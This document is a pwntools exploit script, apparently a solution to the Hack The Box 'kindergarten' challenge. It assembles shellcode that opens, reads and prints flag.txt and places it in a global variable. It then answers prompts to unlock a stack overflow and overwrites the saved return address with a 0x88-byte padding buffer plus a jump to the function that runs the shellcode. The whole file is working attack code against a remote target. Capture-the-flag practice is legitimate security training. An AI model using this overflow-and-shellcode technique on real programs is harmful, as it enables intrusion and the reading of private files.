from pwn import *
import struct

context.update(terminal=["termite", "-e"], arch="amd64")

NAME = "./kindergarten"
BINARY = ELF(NAME)

debug = not True
use_gdb = True
if debug:
    if use_gdb:
        p = gdb.debug(NAME,
            """
            b kids_are_not_allowed_here
            c
            """)
    else:
        p = process(NAME)
else:
    p = remote("docker.hackthebox.eu", 32234)

SHELLCODE = """
    /* push b'flag.txt' */
    push 1
    dec byte ptr [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    /* call open('rsp', 'O_RDONLY', 0) */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    cdq /* rdx=0 */
    syscall
    /* call read into ans */
    mov rdi, rax
    mov rsi, {ans}
    mov rdx, 60
    push SYS_read
    pop rax
    syscall
    /* call write(1, buff, count) */
    mov rdx, 60
    mov rsi, {ans}
    mov rdi, 1
    push SYS_write
    pop rax
    syscall
""".format(ans=BINARY.symbols['ans'])
# First push the assembled SHELLCODE into the global variable ans
p.sendline(asm(SHELLCODE))
p.recvuntil(b"questions?")
# Answer to increment the counter to get the overflow
for i in range(4):
    p.sendline(b"y")
    p.recvuntil(b"ask!")
    p.sendline(b"question")
    p.recvuntil(b"questions?")
p.sendline(b"y")
p.recvuntil(b"finish!")
# Offset to saved $rip
payload = b"A"*0x88
# Jump to kids_are_not_allowed_here which will execute the SHELLCODE
payload += p64(BINARY.symbols["kids_are_not_allowed_here"])
p.sendline(payload)
p.interactive()
